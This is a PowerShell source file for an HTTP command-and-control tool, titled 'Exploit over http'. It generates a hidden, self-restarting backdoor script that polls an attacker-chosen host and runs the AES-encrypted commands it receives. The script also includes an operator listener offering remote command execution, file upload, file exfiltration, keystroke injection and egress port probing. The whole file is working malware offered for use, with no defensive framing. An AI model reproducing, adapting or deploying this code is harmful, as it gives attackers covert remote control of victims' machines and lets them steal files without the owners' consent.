[console]::Title = "Exploit over http"
    function dec ($bb)
    {
        
        if ($bb.Length -gt 32)
        {
            $mac = $bb[-20..-1]
            $bb = $bb[0..($bb.length - 21)]
            $hmac = New-Object System.Security.Cryptography.HMACSHA1
            $hmac.Key = [System.Text.Encoding]::UTF8.GetBytes($key)
            $exp = $hmac.ComputeHash($bb)
            if (@(Compare-Object $mac $exp -Sync 0).Length -ne 0)
            {
                return
            }
                
            $iv = $bb[0..15]
            $enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            $enc.Mode = "CBC"
            $enc.Key = [System.Text.Encoding]::utf8.GetBytes($key)
            $enc.IV = $iv
            $byteee = ($enc.CreateDecryptor()).TransformFinalBlock(($bb[16..$bb.length]), 0, $bb.length-16)
            
            [System.Text.Encoding]::UTF8.GetString($byteee)
        }
    }
    function enc ($b)
    {
        $b = [System.Text.Encoding]::UTF8.GetBytes($b)
        $iv = [byte] 0..255 |Get-Random -Count 16
        $enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        $enc.Mode = "CBC";
        $enc.Key = [System.Text.Encoding]::UTF8.GetBytes($key);
        $enc.IV = $iv;
        $txt = $iv + ($enc.CreateEncryptor()).TransformFinalBlock($b, 0, $b.Length);
        $mac = New-Object System.Security.Cryptography.HMACSHA1;
        $mac.Key = [System.Text.Encoding]::utf8.GetBytes($key);
        $txt + $mac.ComputeHash($txt);
    }
cls
write-host "         _____________                           _____ _______  ___      " -ForegroundColor cyan
write-host "        /            /                          /    //      / /" -ForegroundColor blue -NoNewline;write-host "__" -ForegroundColor cyan -NoNewline;write-host "/" -NoNewline -ForegroundColor blue;Write-Host "      /\." -ForegroundColor cyan
write-host "       /   " -NoNewline -ForegroundColor blue 
write-host "_________" -NoNewline -ForegroundColor cyan; write-host "/" -ForegroundColor blue -NoNewline;write-host "___    ____" -NoNewline -ForegroundColor cyan;write-host "               /    // " -NoNewline -ForegroundColor blue;write-host "___" -NoNewline -ForegroundColor cyan;Write-Host "  /" -ForegroundColor blue -NoNewline; write-host " ____" -ForegroundColor cyan -NoNewline ;write-host "      /  /" -ForegroundColor blue
write-host "      /   /" -ForegroundColor blue -NoNewline;write-host "________" -NoNewline -ForegroundColor cyan;Write-Host " \   \  /   /   " -NoNewline -ForegroundColor blue;write-host "_________" -NoNewline -ForegroundColor cyan;Write-Host "  /    // /  / / /   /" -ForegroundColor blue -NoNewline;write-host "_____" -ForegroundColor cyan -NoNewline;write-host "/  /" -ForegroundColor blue -NoNewline;write-host "___" -ForegroundColor cyan
write-host "     /            /  \   \/   /   /        / /    // /" -ForegroundColor blue -NoNewline;write-host "__" -ForegroundColor cyan -NoNewline;write-host "/ / /   //" -ForegroundColor blue -NoNewline;write-host "____   ____" -ForegroundColor cyan -NoNewline;write-host "/" -ForegroundColor blue
write-host "    /   " -ForegroundColor blue -NoNewline;write-host "_________" -ForegroundColor cyan -NoNewline;write-host "/    \   \  /   /   " -ForegroundColor blue -NoNewline;write-host "___" -ForegroundColor cyan -NoNewline;Write-Host "  / /    //" -ForegroundColor blue -NoNewline;write-host "______" -ForegroundColor cyan -NoNewline;write-host "/ /   /     /   /" -ForegroundColor blue
write-host "   /   /" -ForegroundColor blue -NoNewline;Write-Host "________" -ForegroundColor cyan -NoNewline;write-host "      /   /  \  /   /  / / /    /" -ForegroundColor blue -NoNewline;Write-Host "_______" -ForegroundColor cyan -NoNewline;Write-Host "  /   /     /   /" -ForegroundColor blue
write-host "  /            /     /   /\   \/   /" -ForegroundColor blue -NoNewline;Write-Host "__" -NoNewline -ForegroundColor cyan;Write-Host "/ .//            / /   /     /   /" -ForegroundColor blue -NoNewline;Write-Host "___" -ForegroundColor cyan
write-host " /____________/     /___/  \___\  _____/ /____________/ /___/      \_______\" -ForegroundColor cyan
write-host "                             /   /
                            /   /
                           /   /" -ForegroundColor blue
write-host "                          /___/
                          " -ForegroundColor cyan
write-host "                 Exploitation over http traffic" -ForegroundColor Cyan
write-host "
       >>==========]" -NoNewline;Write-Host "     by natnael wubet      " -ForegroundColor Yellow -NoNewline
" [==========<<"
write-host "       >>=========[]" -NoNewline;write-host " email: natyw4122@gmail.com" -NoNewline -ForegroundColor Yellow;write-host -NoNewline " []=========<<
       >>=========[]";write-host "    phone: +251941226507    " -NoNewline -ForegroundColor Yellow;write-host -NoNewline "[]=========<<
       >>=========[]";Write-Host -NoNewline "    facebook: naty.wubet    " -ForegroundColor Yellow;write-host "[]=========<<
       
       
  +-------------------------------------------[Tips!]-------------------------------------------+
  | This tool uses AES(Advanced Encryption Standard) to encrypt commands over the http traffic. |
  |                                                                                             |
  | You can add your command to [] Command directory then use it on the exploited shell.        |
  |                                                                                             |
  | It is recommended to use 443 (ssl) and 80 (http) ports if they arent in use.                |
  |_____________________________________________________________________________________________|

"



$ip = Read-Host "listener ip"
$key = Read-Host "encryption key (16 degit)"
$port = Read-Host "port"
$li = New-Object System.Net.HttpListener

Write-Host "[+] creating backdoor payload" -ForegroundColor Cyan
$pay = "
while (`$true)
{
    write-host ""key = $key""
    `$web = new-object system.net.webclient
    `$web.headers.add([System.Net.HttpRequestHeader]::UserAgent, ""payload"")
    `$rec = `$web.downloadstring(""http://$ip`:$port/"")
    write-host ""command encrypted: `$rec""
    `$key = ""$key""
    function dec (`$bb)
    {
        
        if (`$bb.Length -gt 32)
        {
            `$mac = `$bb[-20..-1]
            `$bb = `$bb[0..(`$bb.length - 21)]
            `$hmac = New-Object System.Security.Cryptography.HMACSHA1
            `$hmac.Key = [System.Text.Encoding]::UTF8.GetBytes(`$key)
            `$exp = `$hmac.ComputeHash(`$bb)
            if (@(Compare-Object `$mac `$exp -Sync 0).Length -ne 0)
            {
                return
            }
                
            `$iv = `$bb[0..15]
            `$enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            `$enc.Mode = ""CBC""
            `$enc.Key = [System.Text.Encoding]::utf8.GetBytes(`$key)
            `$enc.IV = `$iv
            `$byteee = (`$enc.CreateDecryptor()).TransformFinalBlock((`$bb[16..`$bb.length]), 0, `$bb.length-16)
            [System.Text.Encoding]::UTF8.GetString(`$byteee)
        }
    }
    function enc (`$b)
    {
        `$b = [System.Text.Encoding]::UTF8.GetBytes(`$b)
        `$iv = [byte] 0..255 |Get-Random -Count 16
        `$enc = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        `$enc.Mode = ""CBC"";
        `$enc.Key = [System.Text.Encoding]::UTF8.GetBytes(`$key);
        `$enc.IV = `$iv;
        `$txt = `$iv + (`$enc.CreateEncryptor()).TransformFinalBlock(`$b, 0, `$b.Length);
        `$mac = New-Object System.Security.Cryptography.HMACSHA1;
        `$mac.Key = [System.Text.Encoding]::utf8.GetBytes(`$key);
        `$txt + `$mac.ComputeHash(`$txt);
    }
    `$rec = `$rec -split (' ')
    `$rec = dec -bb `$rec
    write-host ""raw command:`$rec""
    if (`$rec -eq ""upload"")
    {
        `$web = new-object system.net.webclient
        `$web.headers.add([System.Net.HttpRequestHeader]::UserAgent, ""payload"")
        `$web.uploadstringasync(""http://$ip`:$port"", ""ready"")

        `$web = new-object system.net.webclient
        `$web.headers.add([System.Net.HttpRequestHeader]::UserAgent, ""payload"")
        `$byte = `$web.downloadstring(""http://$ip`:$port"")
        `$byte = dec_byte -bb `$byte
        [string]`$bb = `$byte
        [byte[]]`$b = `$bb -split ' '
        [system.io.file]::writeallbytes(""uploaded"", `$b)
    } elseif (`$rec -eq ""download"")
    {
        `$web = new-object system.net.webclient
        `$web.headers.add([System.Net.HttpRequestHeader]::UserAgent, ""payload"")
        `$web.uploadstringasync(""http://$ip`:$port"", ""ready"")

        `$web = new-object system.net.webclient
        `$web.headers.add([System.Net.HttpRequestHeader]::UserAgent, ""payload"")
        `$name = `$web.downloadstring(""http://$ip`:$port"")

        `$web = new-object system.net.webclient
        `$web.headers.add([System.Net.HttpRequestHeader]::UserAgent, ""payload"")
        `$web.uploadstringasync(""http://$ip`:$port"", ""[+] writing bytes"")
        
        [byte[]] `$read = cat `$name -Encoding Byte
        [System.IO.File]::WriteAllLines(""`$((pwd).Path)\tmp"", ([string]`$read))

        `$web = new-object system.net.webclient
        `$web.headers.add([System.Net.HttpRequestHeader]::UserAgent, ""payload"")
        `$web.uploadstringasync(""http://$ip`:$port"", ""`$(cat tmp)"")
        
    } else {
        try{
            `$es = `$(iex [string]`$rec)
            write-host ""result raw = `$es""
            `$es = enc -b `$es
            write-host ""result encrypted = `$es""

            `$web = new-object system.net.webclient
            `$web.headers.add([System.Net.HttpRequestHeader]::UserAgent, ""payload"")
            `$web.uploadstringAsync(""http://$ip`:$port"",""`$es"")
        } catch {
            `$web = new-object system.net.webclient
            `$web.headers.add([System.Net.HttpRequestHeader]::UserAgent, ""payload"")
            `$es = enc -b `$_
            `$web.uploadstringAsync(""http://$ip`:$port/"",""`$es"")
        }
    }
}

"
sc ./back.ps1 $pay
sc ./back.bat "@:a
@powershell -executionpolicy bypass -w hidden -noprofile -file .\back.ps1
@call :a" -Encoding Ascii
Write-Host "[+] backdoor payload created at $((pwd).path)\back.ps1 and back.bat" -ForegroundColor Cyan
$li.Prefixes.Add("http://$ip"+":$port/")
[console]::Title = $li.Prefixes
$li.Start()
while ($true)
{
    Write-Host "Listening..." -ForegroundColor Cyan -NoNewline
    $cont = $li.GetContext()
    Write-Host "[connection captured]" -ForegroundColor green
    $req = $cont.Request
    $res = $cont.Response
    $usr = $cont.User

    if ($req.HttpMethod -eq "GET")
    {
        if ($req.UserAgent -eq "payload")
        {
            Write-Host "

            |--------------Request-info-------------------|
             User agent: $($req.UserAgent)
            |                                             |
             End point: $($req.RemoteEndPoint)
            |                                             |
             IP: $($cont.Request.RemoteEndPoint.Address.IPAddressToString)
            |                                             |
             Header: $($req.Headers)
            |                                             |
             Seeking: $($req.RawUrl) 
            |---------------------------------------------|
                                                 

            "
            $com = Read-Host "$($req.RemoteEndPoint.Address.IPAddressToString)> "
            if ($com)
            {
                if ($com -ieq "Upload")
                {
                    Write-Host "==Built-in-command-""UpLoad""==`n" -fo White
                    $file = Read-Host file
                    if ($file)
                    {
                        if (Test-Path $file)
                        {
                            Write-Host "[+] writing bytes..." -ForegroundColor Cyan
                            [byte[]] $read = cat $file -Encoding Byte
                            [System.IO.File]::WriteAllLines("$((pwd).Path)\tmp", ([string]$read))
                            Write-Host "[+] telling the payload to recive bytes" -ForegroundColor Cyan
                            [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$(enc -b upload)")
                            $res.ContentLength64 = $b.Length
                            $out = $res.OutputStream
                            $out.Write($b, 0, $b.Length)
                            $out.Close()
                            $cont = $li.GetContext()
                            $req = $cont.Request
                            $res = $cont.Response
                            if ($req.HttpMethod -eq "POST")
                            {
                                if ($req.UserAgent -eq "payload")
                                {
                                    $bi = $req.ContentLength64 + 1
                                    $buffer = New-Object byte[] $bi
                                    $i=9
                                    $s=2
                                    while ($i -gt $s)
                                    {
                                        $i = $req.InputStream.Read($buffer, 0 ,$bi)
                                        $s = $bi
                                        $result = $req.ContentEncoding.GetString($buffer, 0, $i)
                                    }
                                    if ($result)
                                    {
                                        if ($result -eq "ready")
                                        {
                                            Write-Host "[+] payload is ready to recive the file" -ForegroundColor Cyan
                                            Write-Host "[+] waiting till payload listens" -ForegroundColor Cyan
                                            $cont = $li.GetContext()
                                            $req = $cont.Request
                                            $res = $cont.Response
                                            if ($req.HttpMethod -eq "GET")
                                            {
                                                if ($req.UserAgent -eq "payload")
                                                {
                                                    Write-Host "[+] sending file to the target" -ForegroundColor Cyan
                                                    [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$(cat tmp)")
                                                    $res.ContentLength64 = $b.Length
                                                    $out = $res.OutputStream
                                                    $out.Write($b, 0, $b.Length)
                                                    $out.Close()
                                                    Write-Host "[+] done`n" -ForegroundColor Cyan
                                                    <#$cont = $li.GetContext()
                                                    $req = $cont.Request
                                                    $res = $cont.Response
                                                    if ($req.HttpMethod -eq "POST")
                                                    {
                                                        if ($req.UserAgent -eq "payload")
                                                        {
                                                            $bi = $req.ContentLength64 + 1
                                                            $buffer = New-Object byte[] $bi
                                                            $i=9
                                                            $s=2
                                                            while ($i -gt $s)
                                                            {
                                                                $i = $req.InputStream.Read($buffer, 0 ,$bi)
                                                                $s = $bi
                                                                $result = $req.ContentEncoding.GetString($buffer, 0, $i)
                                                            }
                                                            if ($result)
                                                            {
                                                                if ($result -eq "done")
                                                                {
                                                                    $fname = Read-Host "file name"
                                                                    [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$fname")
                                                                    $res.ContentLength64 = $b.Length
                                                                    $out = $res.OutputStream
                                                                    $out.Write($b, 0, $b.Length)
                                                                    $out.Close()
                                                                    $cont = $li.GetContext()
                                                                    $req = $cont.Request
                                                                    $res = $cont.Response
                                                                    Write-Host "[+] done" -ForegroundColor Cyan
                                                                }
                                                            }
                                                        }
                                                    }#>
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                if ($com -ieq "download")
                {
                    write-host "=====Built-in-command-""Download""====`n" -ForegroundColor White
                    $filen = Read-Host file
                    if ($filen)
                    {
                        [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$(enc -b download)")
                        $res.ContentLength64 = $b.Length
                        $out = $res.OutputStream
                        $out.Write($b, 0, $b.Length)
                        $out.Close()
                        $cont = $li.GetContext()
                        $req = $cont.Request
                        $res = $cont.Response
						
						
                        if ($req.HttpMethod -eq "POST")
                        {
                            if ($req.UserAgent -eq "payload")
                            {
								$bi = $req.ContentLength64 + 1
                                $buffer = New-Object byte[] $bi
                                $i=9
                                $s=2
                                while ($i -gt $s)
                                {
                                    $i = $req.InputStream.Read($buffer, 0 ,$bi)
                                    $s = $bi
                                    $result = $req.ContentEncoding.GetString($buffer, 0, $i)
                                }
                                if ($result)
                                {
                                    if ($result -eq "ready")
                                    {
										$i=0
										write-host "[+] payload is ready to upload the file" -foregroundcolor cyan
										[byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$filen")
										$res.ContentLength64 = $b.Length
										$out = $res.OutputStream
										$out.Write($b, 0, $b.Length)
										$out.Close()
										$cont = $li.GetContext()
										$req = $cont.Request
										$res = $cont.Response
										
										if ($req.httpmethod -eq "GET")
										{
											if ($req.useragent -eq "payload")
											{
												[byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$filen")
												$res.ContentLength64 = $b.Length
												$out = $res.OutputStream
												$out.Write($b, 0, $b.Length)
												$out.Close()
											}
										}
										$cont = $li.GetContext()
										$req = $cont.Request
										$res = $cont.Response
										
										
										
										if ($req.HttpMethod -eq "POST")
										{
											
											if ($req.UserAgent -eq "payload")
											{
												
												$bi = $req.ContentLength64 + 1
												$buffer = New-Object byte[] $bi
												$i=9
												$s=2
												while ($i -gt $s)
												{
													$i = $req.InputStream.Read($buffer, 0 ,$bi)
													$s = $bi
													$result = $req.ContentEncoding.GetString($buffer, 0, $i)
												}
												if ($result)
												{
													if ($result -eq "[+] writing bytes")
													{
														Write-host "[+] waiting for bytes" -foregroundcolor cyan
														$cont = $li.GetContext()
														$req = $cont.Request
														$res = $cont.Response
														if ($req.HttpMethod -eq "POST")
														{
															if ($req.UserAgent -eq "payload")
															{
																$bi = $req.ContentLength64 + 1
																$buffer = New-Object byte[] $bi
																$i=9
																$s=2
																while ($i -gt $s)
																{
																	$i = $req.InputStream.Read($buffer, 0 ,$bi)
																	$s = $bi
																	$result = $req.ContentEncoding.GetString($buffer, 0, $i)
																}
																if ($result)
																{
                                                                    $result
																	$out = read-host "file transfered, save as"
																	if ($out)
																	{
																		[string]$bb = $result
																		[byte[]]$b = $bb -split ' '
																		[system.io.file]::writeallbytes($out, $b)
																		write-host "[+] done`n" -foregroundcolor cyan
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}						
                    }
                }
				if ($com -ieq "send_key")
                {
                    write-host "=====Built-in-command-""remote keyboard""====`n" -ForegroundColor White
                    $keys = Read-Host "Strok"
                    [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes(" `$(`$shell=new-object -com wscript.shell;`$shell.sendkeys(""$keys""))")
                    $res.ContentLength64 = $b.Length
                    $out = $res.OutputStream
                    $out.Write($b, 0, $b.Length)
                    $out.Close()
                }
                if ($com -ieq "clear")
                {
                    cls
                }
                if ($com -ieq "bye")
                {
                    try {
                        [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$(enc -b "`$(exit)")")
                        $res.ContentLength64 = $b.Length
                        $out = $res.OutputStream
                        $out.Write($b, 0, $b.Length)
                        $out.Close()
                        $li.Close()
                        exit
                    } catch {}
                }
                if ($com -ieq "cd")
                {
                    Write-Host "======Built-in-command-""change directory""==`n" -ForegroundColor White
                    $cd = Read-Host "where?"
                    try {
                        [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$(enc -b "`$(cd $cd)")")
                        $res.ContentLength64 = $b.Length
                        $out = $res.OutputStream
                        $out.Write($b, 0, $b.Length)
                        $out.Close()
                    } catch {}
                }
                if ($com -ieq "exec_posh")
                {
                    Write-Host "======Built-in-command-""execute powershell command""==`n" -ForegroundColor White
                    $posh = Read-Host "PoSH>"
                    try {
                        [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$(enc -b "`$($posh)")")
                        $res.ContentLength64 = $b.Length
                        $out = $res.OutputStream
                        $out.Write($b, 0, $b.Length)
                        $out.Close()
                    } catch {}
                }
                if ($com -ieq "exec_cmd")
                {
                    Write-Host "======Built-in-command-""execute command prompt command""==`n" -ForegroundColor White
                    $cmd = Read-Host "CMD>"
                    try {
                        [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$(enc -b "`$(cmd /c $cmd)")")
                        $res.ContentLength64 = $b.Length
                        $out = $res.OutputStream
                        $out.Write($b, 0, $b.Length)
                        $out.Close()
                    } catch {}
                } 
                if ($com -ieq "egress")
                {
                    Write-Host "======Built-in-command-""egress traffic""==`n" -ForegroundColor White
                    $ipaddr = Read-Host "regress ip address [$ip]"
                    if ([string]::IsNullOrEmpty($ipaddr))
                    {
                        $ipaddr = $ip
                    }
                    $ports = Read-Host "port range(low-high)"
                    $ports = $ports -split ('-')
                    Write-Host "[+] creating regress script" -ForegroundColor Cyan
                    sc ./regress.ps1 "
                    `$tmp = read-host press enter to start the listener
                    `$str = $($ports[0])
                    `$ostr = `$str
                    `$end = $($ports[1])
                    write-host ""creating jobs..."" -foregroundcolor cyan
                    while (`$str -le `$end)
                    {
                        `$scr = {
                            param(`$p = `$args[1])
                            `$lis = new-object system.net.ipendpoint([ipaddress]::any, `$p)
                            `$sock = new-object system.net.sockets.tcplistener `$lis
                            `$sock.start()
                            `$cli = `$sock.accepttcpclient()
                            `$tar = `$cli.client.remoteendpoint
                            `$me = `$cli.client.localendpoint
                            `$me = `$me -split (':')
                            `$tar = `$tar -split (':')
                            write-host ""`$(`$tar[0]) connected to `$(`$me[0])"" -foregroundcolor yellow
                            Write-Host ""[`$(`$tar[1])] ===egress===>> [`$(`$me[1])]"" -foregroundcolor yellow
                            `$sock.stop()
                        }
                        start-job -scriptblock `$scr -name `$str -ArgumentList `$str |out-null
                        `$str++
                    }
                    write-host ""listening from `$ostr to `$end""
                    `$x = 0
                    `$i = `$ostr


                    while (`$true)
                    {
                        if ((get-job -name `$i).state -eq ""Completed"")
                        {
                            Receive-Job -name `$i
                        }
                        `$i++
                        if (`$i -ge `$end)
                        {
                            `$i=`$ostr
                        }
                    }

                    "
                    Write-Host "[+] done" -ForegroundColor Cyan
                    sc ./regress.bat "@powershell -executionpolicy bypass -noexit -nologo -file ./regress.ps1" -Encoding Ascii
                    start ./regress.bat
                    Write-Host "[+] creating egress sender" -ForegroundColor Cyan
                    sc ./commands/egress.ps1 " `$(`$str = $($ports[0]);`$ostr = `$str;`$end = $($ports[1]);[array]`$ps = """";while (`$str -le `$end) { `$tcp = new-object system.net.sockets.tcpclient;`$tmp = `$tcp.beginConnect(""$ipaddr"",`$str,`$null,`$null);if (`$tcp.connected) { echo ""[+] `$str connected""; }; `$str++ };)"
                    $file = cat ./commands/egress.ps1
                    [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$(enc -b $file)")
                    $res.ContentLength64 = $b.Length
                    $out = $res.OutputStream
                    $out.Write($b, 0, $b.Length)
                    $out.Close()
                    $com = "egress.ps1"
                }

				
                if (Test-Path ./commands/$com)
                {
                    try {
                        $file = cat ./commands/$com
                        [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$(enc -b $file)")
                        $res.ContentLength64 = $b.Length
                        $out = $res.OutputStream
                        $out.Write($b, 0, $b.Length)
                        $out.Close()
                   } catch {}
                } else {
                    try {
                        [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$(enc -b "#0")")
                        $res.ContentLength64 = $b.Length
                        $out = $res.OutputStream
                        $out.Write($b, 0, $b.Length)
                        $out.Close()
                        "command not found"
                    } catch {}
                }
            } else {
                try {
                        $file = cat ./commands/$com
                        [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("$(enc -b "#2")")
                        $res.ContentLength64 = $b.Length
                        $out = $res.OutputStream
                        $out.Write($b, 0, $b.Length)
                        $out.Close()
                   } catch {}
                "null entry"
            }
        } else {
            Write-Host "unknown visitor"
            [byte[]] $b = [System.Text.Encoding]::UTF8.GetBytes("you are not allowed")
            $res.ContentLength64 = $b.Length
            $out = $res.OutputStream
            $out.Write($b, 0, $b.Length)
            $out.Close()
        }
    
    } elseif ($req.HttpMethod -eq "POST")
    {
        $bi = $req.ContentLength64 + 1
        $buffer = New-Object byte[] $bi
        $i=9
        $s=2
        while ($i -gt $s)
        {
            $i = $req.InputStream.Read($buffer, 0 ,$bi)
            $s = $bi
            $result = $req.ContentEncoding.GetString($buffer, 0, $i)
        }
        $result = $result -split (' ')
        Write-Host "Result:$(dec -bb $result)" -ForegroundColor White
            
    } 
}